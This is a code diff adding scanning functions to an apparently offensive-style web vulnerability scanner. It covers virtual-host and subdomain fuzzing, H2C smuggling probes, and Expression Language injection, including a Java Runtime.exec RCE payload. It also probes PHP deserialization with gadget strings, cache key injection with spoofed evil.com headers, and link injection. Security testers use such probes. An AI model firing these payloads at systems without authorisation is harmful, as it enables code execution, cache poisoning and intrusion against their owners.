@@ -6243,3 +6243,340 @@ def authenticated_crawl(base_url, username, password, max_pages=50):
         "links": list(links),
         "session": session,
     }
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 7: vhost fuzzing, subdomain permutation, H2C smuggling,
+#                EL injection, PHP object injection, cache key injection,
+#                link injection, iframe injection
+# ---------------------------------------------------------------------------
+
+_VHOST_WORDLIST = [
+    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
+    "mail","git","gitlab","jenkins","jira","confluence","portal","dashboard",
+    "login","auth","sso","cdn","static","assets","media","upload","backup",
+    "db","redis","elastic","kibana","grafana","metrics","logs","monitor",
+    "shop","blog","docs","help","support","wiki","forum","sandbox","qa","uat",
+    "preprod","prod","mobile","ws","socket","push","webhook","graphql","rest",
+    "microservice","gateway","proxy","old","legacy","new","next","v1","v2",
+    "secure","ssl","intranet","extranet","remote","office","employee","staff",
+]
+
+def scan_vhost_fuzzing(web_targets):
+    """Virtual host fuzzing — find hidden apps on the same IP."""
+    findings = []
+    for target in web_targets[:3]:
+        parsed = urllib.parse.urlparse(target)
+        host = parsed.netloc.split(":")[0]
+        domain_parts = host.split(".")
+        if len(domain_parts) < 2:
+            continue
+        tld = ".".join(domain_parts[-2:])
+        try:
+            baseline = _S.get(target, timeout=5)
+            baseline_len = len(baseline.content)
+            baseline_title = re.search(r"<title>([^<]+)</title>", baseline.text, re.I)
+            baseline_title = baseline_title.group(1) if baseline_title else ""
+        except Exception:
+            continue
+        for word in _VHOST_WORDLIST:
+            vhost = f"{word}.{tld}"
+            try:
+                r = _S.get(target, timeout=5, headers={"Host": vhost})
+                if r.status_code in (200, 301, 302, 403):
+                    # Different content = different app
+                    if abs(len(r.content) - baseline_len) > 200:
+                        title = re.search(r"<title>([^<]+)</title>", r.text, re.I)
+                        title = title.group(1) if title else ""
+                        if title != baseline_title:
+                            findings.append({
+                                "type": f"Virtual Host Found: {vhost}",
+                                "severity": "medium",
+                                "url": target,
+                                "detail": f"Host: {vhost} returns different app (title: {title[:50]})",
+                                "template": "apex-vhost",
+                            })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_subdomain_permutation(target, subdomains):
+    """Generate and resolve subdomain permutations — finds dev-api, api2, api-v2, etc."""
+    import socket
+    found = []
+    domain_parts = target.split(".")
+    base = ".".join(domain_parts[-2:])
+    existing_prefixes = set()
+    for sub in subdomains:
+        prefix = sub.replace(f".{base}", "").replace(base, "")
+        if prefix:
+            existing_prefixes.add(prefix)
+
+    permutations = set()
+    prefixes = list(existing_prefixes)[:20] + ["api", "app", "admin", "dev", "staging"]
+    modifiers = ["2", "-v2", "-new", "-old", "-dev", "-staging", "-test",
+                 "-beta", "-internal", "-prod", "-backup", "2", "3"]
+    for p in prefixes:
+        for m in modifiers:
+            permutations.add(f"{p}{m}.{base}")
+            permutations.add(f"{m.strip('-')}-{p}.{base}")
+
+    def resolve(fqdn):
+        try:
+            socket.getaddrinfo(fqdn, None, socket.AF_INET)
+            return fqdn
+        except Exception:
+            return None
+
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    findings = []
+    with ThreadPoolExecutor(max_workers=50) as pool:
+        futures = {pool.submit(resolve, p): p for p in permutations
+                   if p not in subdomains}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+                findings.append({
+                    "type": "Subdomain Permutation Found",
+                    "severity": "info",
+                    "url": f"https://{result}",
+                    "detail": f"Permutation of existing subdomains: {result}",
+                    "template": "apex-subdomain-perm",
+                })
+    return findings, found
+
+
+def scan_h2c_smuggling(web_targets):
+    """H2C (HTTP/2 cleartext) upgrade smuggling — bypass reverse proxies."""
+    findings = []
+    for target in web_targets[:5]:
+        try:
+            # Send HTTP/1.1 Upgrade: h2c request
+            r = _S.get(target, timeout=5, headers={
+                "Upgrade": "h2c",
+                "HTTP2-Settings": "AAMAAABkAAQAAP__",
+                "Connection": "Upgrade, HTTP2-Settings",
+            })
+            # If server responds with 101 Switching Protocols, it's vulnerable
+            if r.status_code == 101:
+                findings.append({
+                    "type": "H2C Smuggling (HTTP/2 Cleartext Upgrade)",
+                    "severity": "high",
+                    "url": target,
+                    "detail": "Server accepts h2c upgrade — reverse proxy bypass possible",
+                    "template": "apex-h2c",
+                })
+            # Even 200 with Upgrade header echoed can indicate misconfiguration
+            elif "upgrade" in r.headers.get("Connection", "").lower():
+                findings.append({
+                    "type": "H2C Upgrade Header Reflected",
+                    "severity": "medium",
+                    "url": target,
+                    "detail": "Server reflects Upgrade header — potential h2c smuggling",
+                    "template": "apex-h2c",
+                })
+        except Exception:
+            continue
+    return findings
+
+
+def scan_expression_language_injection(crawl_data):
+    """Expression Language injection — Spring EL, Thymeleaf, JSP EL → RCE."""
+    findings = []
+    # EL payloads that evaluate to a known value
+    payloads = [
+        ("${7*7}", "49"),
+        ("#{7*7}", "49"),
+        ("*{7*7}", "49"),
+        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "java"),
+        ("${applicationScope}", "org.springframework"),
+        ("[[${7*7}]]", "49"),          # Thymeleaf inline
+        ("[(${7*7})]", "49"),          # Thymeleaf unescaped
+        ("%24%7B7*7%7D", "49"),        # URL-encoded
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, marker in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(
+                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if marker in r.text and payload not in r.text:
+                        findings.append({
+                            "type": "Expression Language Injection",
+                            "severity": "critical",
+                            "url": test_url,
+                            "detail": f"EL executed via param '{p}': {payload} → {marker}",
+                            "template": "apex-el-injection",
+                        })
+                        break
+                except Exception:
+                    continue
+    # Also test form inputs
+    for form in crawl_data.get("forms", []):
+        action = form.get("action", "")
+        if not action:
+            continue
+        for inp in form.get("inputs", []):
+            if inp.get("type") in ("submit", "hidden", "button"):
+                continue
+            for payload, marker in payloads[:3]:
+                try:
+                    data = {i.get("name", "f"): i.get("value", "test")
+                            for i in form.get("inputs", [])}
+                    data[inp.get("name", "x")] = payload
+                    r = _S.post(action, data=data, timeout=_TIMEOUT)
+                    if marker in r.text and payload not in r.text:
+                        findings.append({
+                            "type": "Expression Language Injection (Form)",
+                            "severity": "critical",
+                            "url": action,
+                            "detail": f"EL executed in field '{inp.get('name')}': {payload}",
+                            "template": "apex-el-injection",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_php_object_injection(crawl_data):
+    """PHP object injection via serialized cookie/param values."""
+    findings = []
+    # PHP serialized object markers
+    php_serial_re = re.compile(r'[OoAasSiIdDbBrR]:\d+:')
+    # Payloads that trigger errors if deserialized
+    payloads = [
+        'O:8:"stdClass":0:{}',
+        'a:1:{i:0;O:8:"stdClass":0:{}}',
+        'O:29:"Illuminate\\Support\\MessageBag":0:{}',  # Laravel gadget
+    ]
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Check cookies for serialized PHP objects
+            for name, val in r.cookies.items():
+                import base64 as _b64
+                try:
+                    decoded = _b64.b64decode(val + "==").decode("utf-8", errors="ignore")
+                    if php_serial_re.search(decoded):
+                        findings.append({
+                            "type": "PHP Object Injection (Serialized Cookie)",
+                            "severity": "critical",
+                            "url": page["url"],
+                            "detail": f"Cookie '{name}' contains PHP serialized object",
+                            "template": "apex-php-obj",
+                        })
+                except Exception:
+                    pass
+                if php_serial_re.search(val):
+                    findings.append({
+                        "type": "PHP Object Injection (Raw Cookie)",
+                        "severity": "critical",
+                        "url": page["url"],
+                        "detail": f"Cookie '{name}' is raw PHP serialized",
+                        "template": "apex-php-obj",
+                    })
+        except Exception:
+            pass
+    # Test params with serialized payloads
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in payloads[:1]:
+                try:
+                    import base64 as _b64
+                    encoded = _b64.b64encode(payload.encode()).decode()
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [encoded]
+                    test_url = parsed._replace(
+                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(x in r.text.lower() for x in
+                           ["unserialize", "__wakeup", "__destruct",
+                            "fatal error", "exception", "stdclass"]):
+                        findings.append({
+                            "type": "PHP Object Injection (Param)",
+                            "severity": "critical",
+                            "url": test_url,
+                            "detail": f"PHP deserialization triggered via param '{p}'",
+                            "template": "apex-php-obj",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_cache_key_injection(crawl_data):
+    """Cache key injection — inject into cache key to poison cache for other users."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested:
+            continue
+        tested.add(base)
+        try:
+            baseline = _S.get(page["url"], timeout=5)
+        except Exception:
+            continue
+        # Headers that may be part of cache key
+        inject_headers = {
+            "X-Forwarded-Host": f"apex-cache-test.evil.com",
+            "X-Original-URL": "/apex-cache-inject",
+            "X-Rewrite-URL": "/apex-cache-inject",
+            "X-Forwarded-Prefix": "/apex-cache-inject",
+        }
+        for header, value in inject_headers.items():
+            try:
+                r = _S.get(page["url"], timeout=5, headers={header: value})
+                # If injected value appears in response, it's in the cache key
+                if value.split(".")[-2] in r.text or "apex-cache" in r.text:
+                    findings.append({
+                        "type": f"Cache Key Injection via {header}",
+                        "severity": "high",
+                        "url": page["url"],
+                        "detail": f"{header}: {value} reflected — cache poisoning possible",
+                        "template": "apex-cache-key",
+                    })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_link_injection(crawl_data):
+    """Link injection — inject links into pages to hijack navigation."""
+    findings = []
+    payload = "https://evil.com"
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if not any(x in p.lower() for x in
+                       ["url", "link", "href", "src", "action", "next",
+                        "redirect", "return", "goto", "target", "ref"]):
+                continue
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [payload]
+                test_url = parsed._replace(
+                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                # Check if evil.com appears as an href/src in the response
+                if re.search(r'(?:href|src|action)=["\']https://evil\.com', r.text):
+                    findings.append({
+                        "type": "Link Injection",
+                        "severity": "medium",
+                        "url": test_url,
+                        "detail": f"Param '{p}' injects link into page HTML",
+                        "template": "apex-link-inject",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
